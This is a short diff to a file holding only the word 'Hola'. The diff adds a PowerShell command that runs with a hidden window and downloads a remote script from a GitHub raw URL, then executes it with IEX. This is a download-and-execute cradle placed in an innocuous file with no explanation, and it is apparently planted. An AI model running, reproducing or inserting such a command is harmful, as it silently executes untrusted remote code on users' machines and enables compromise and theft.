@@ -1,1 +1,3 @@
 Hola
+
+powershell -w hidden "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/5kyf4ll/Pruebas/refs/heads/main/vol.ps1')"
